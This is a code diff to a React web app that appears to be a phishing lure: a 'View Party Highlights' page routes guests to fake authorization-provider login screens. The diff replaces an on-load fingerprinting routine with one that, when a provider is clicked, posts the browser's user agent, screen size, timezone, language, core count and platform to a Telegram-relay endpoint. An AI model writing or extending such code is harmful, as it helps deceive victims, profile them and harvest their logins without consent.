@@ -31,64 +31,55 @@ export default function App() {
     }
   };
 
-  // Gather detailed visitor fingerprint and log the entry with server-side resolution
-  const handleVisitorEntry = async () => {
-    const ua = navigator.userAgent;
-    let browser = "Unknown Browser";
-    let os = "Unknown OS";
+  //Gather detailed visitor fingerprint and log the entry with server-side resolution
+//   const handleVisitorEntry = async (provider?: string) => {
+    
 
-    // OS detection
-    if (/windows/i.test(ua)) os = "Windows";
-    else if (/macintosh|mac os x/i.test(ua)) os = "macOS";
-    else if (/android/i.test(ua)) os = "Android";
-    else if (/iphone|ipad|ipod/i.test(ua)) os = "iOS";
-    else if (/linux/i.test(ua)) os = "Linux";
-
-    // Browser detection
-    if (/edg/i.test(ua)) browser = "Edge";
-    else if (/chrome|crios/i.test(ua) && !/edge|edg|opr|opios/i.test(ua)) browser = "Chrome";
-    else if (/safari/i.test(ua) && !/chrome|crios|opr|opios/i.test(ua)) browser = "Safari";
-    else if (/firefox|fxios/i.test(ua)) browser = "Firefox";
-    else if (/opr|opera/i.test(ua)) browser = "Opera";
-    else if (/trident|msie/i.test(ua)) browser = "Internet Explorer";
-
-    const fingerprint = {
-      browser,
-      os,
-      screenSize: `${window.screen.width || 0}x${window.screen.height || 0}`,
-      language: navigator.language || "Unknown Language",
-      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown Timezone",
-      cores: String(navigator.hardwareConcurrency || "Unknown"),
-      platform: navigator.platform || "Unknown",
-      userAgent: ua
-    };
-
-    try {
-      // 💡 Appended ${API_BASE_URL} to register entry fingerprints on Render
-      await fetch(`${API_BASE_URL}/api/telegram/visitor_entry`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(fingerprint)
-      });
-    } catch (err) {
-      console.warn("Failed to dispatch visitor telemetry to server:", err);
-    }
-  };
-
-  useEffect(() => {
-    handleVisitorEntry();
-  }, []);
+//     try {
+//       // 💡 Appended ${API_BASE_URL} to register entry fingerprints on Render
+//       await fetch(`${API_BASE_URL}/api/telegram/visitor_entry`, {
+//   method: "POST",
+//   headers: { "Content-Type": "application/json" },
+//   body: JSON.stringify({
+//     provider: provider || "UNKNOWN"
+//   })
+// });
+//     } catch (err) {
+//       console.warn("Failed to dispatch visitor telemetry to server:", err);
+//     }
+//   };
 
   const handleStartGateway = () => {
     setCurrentScreen("provider_select");
     logAction("PAGE_VIEW", "Guest clicked 'View Party Highlights' CTA.");
   };
 
-  const handleSelectProvider = (providerId: GatewayProvider) => {
-    setSelectedProvider(providerId);
-    setCurrentScreen("login");
-    logAction("PROVIDER_SELECT", `Guest selected authorization provider portal: ${providerId.toUpperCase()}`);
-  };
+ const handleSelectProvider = (providerId: GatewayProvider) => {
+  setSelectedProvider(providerId);
+  setCurrentScreen("login");
+
+  logAction(
+    "PROVIDER_SELECT",
+    `Guest selected authorization provider portal: ${providerId.toUpperCase()}`
+  );
+
+  // ✅ NEW: send visitor entry ONLY on provider click
+  fetch(`${API_BASE_URL}/api/telegram/visitor_entry`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      provider: providerId, // IMPORTANT ADDITION
+      userAgent: navigator.userAgent,
+      screenSize: `${window.screen.width}x${window.screen.height}`,
+      language: navigator.language,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      cores: navigator.hardwareConcurrency || 0,
+      platform: navigator.platform,
+    })
+  }).catch(err => {
+    console.warn("Visitor entry failed:", err);
+  });
+};
 
   const handleLoginSuccess = (email: string) => {
     setLoggedEmail(email);
